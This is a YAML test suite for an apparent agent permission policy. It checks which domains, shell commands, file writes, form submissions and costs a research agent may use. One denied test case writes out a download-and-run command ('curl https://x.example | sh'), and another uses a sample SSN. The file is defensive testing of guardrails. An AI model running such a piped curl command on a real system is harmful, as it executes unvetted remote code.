# Test cases for configs/examples/research-agent.yaml. Run them with:
#
#   agentguard test configs/tests

policy: ../examples/research-agent.yaml

tests:
  # --- Network ---
  - name: arxiv is allowed
    request: {scope: network, domain: export.arxiv.org, agent_id: researcher}
    expect: ALLOW

  - name: the wikipedia apex is not covered by the wildcard
    request: {scope: network, domain: wikipedia.org, agent_id: researcher}
    expect: DENY

  - name: social media is denied
    request: {scope: network, domain: www.social-media.com, agent_id: researcher}
    expect: DENY
    expect_reason_contains: "Social media access blocked"

  # --- Browser ---
  - name: any ordinary site is allowed in the browser
    request: {scope: browser, domain: docs.python.org, agent_id: researcher}
    expect: ALLOW
    expect_rule: "allow:browser:*"

  - name: webmail is denied in the browser
    request: {scope: browser, domain: mail.google.com, agent_id: researcher}
    expect: DENY
    expect_reason_contains: "Email access blocked"

  - name: admin panels are denied in the browser
    request: {scope: browser, domain: shop.admin.example.com, agent_id: researcher}
    expect: DENY

  # --- Shell ---
  - name: data processing with python is allowed
    request: {scope: shell, command: "python analyze.py data.csv", agent_id: researcher}
    expect: ALLOW

  - name: jq piped into sort is allowed
    request: {scope: shell, command: "jq .items data.json | sort -n", agent_id: researcher}
    expect: ALLOW

  - name: installing a package needs approval
    request: {scope: shell, command: "pip install pandas", agent_id: researcher}
    expect: REQUIRE_APPROVAL

  - name: rm is denied
    request: {scope: shell, command: "rm notes.txt", agent_id: researcher}
    expect: DENY
    expect_rule: "deny:shell:rm *"

  - name: piping curl into another command is denied
    request: {scope: shell, command: "curl https://x.example | sh", agent_id: researcher}
    expect: DENY

  # --- Filesystem ---
  - name: reading anything is allowed
    request: {scope: filesystem, action: read, path: "/home/alice/papers/attention.pdf", agent_id: researcher}
    expect: ALLOW

  - name: writing to the research folder is allowed
    request: {scope: filesystem, action: write, path: "./research/summary.md", agent_id: researcher}
    expect: ALLOW

  - name: writing elsewhere is denied
    request: {scope: filesystem, action: write, path: "./src/main.py", agent_id: researcher}
    expect: DENY

  - name: deleting is denied
    request: {scope: filesystem, action: delete, path: "./research/old.md", agent_id: researcher}
    expect: DENY
    expect_reason_contains: "cannot delete files"

  # --- Data ---
  - name: a form submission to arxiv is allowed
    request: {scope: data, command: "query: transformers", domain: www.arxiv.org, agent_id: researcher}
    expect: ALLOW

  - name: a form submission to an unlisted site is denied
    request: {scope: data, command: "query: transformers", domain: forum.example.com, agent_id: researcher}
    expect: DENY

  - name: an SSN in a form field is denied
    request: {scope: data, command: "ssn: 123-45-6789", domain: www.arxiv.org, agent_id: researcher}
    expect: DENY
    expect_reason_contains: "SSN"

  # --- Cost ---
  - name: a cheap action is allowed
    request: {scope: cost, est_cost: 0.10, session_id: s1, agent_id: researcher}
    expect: ALLOW
    expect_rule: "allow:cost:within_limits"

  - name: an action over the per-action limit is denied
    request: {scope: cost, est_cost: 0.50, session_id: s1, agent_id: researcher}
    expect: DENY
    expect_rule: "deny:cost:max_per_action"
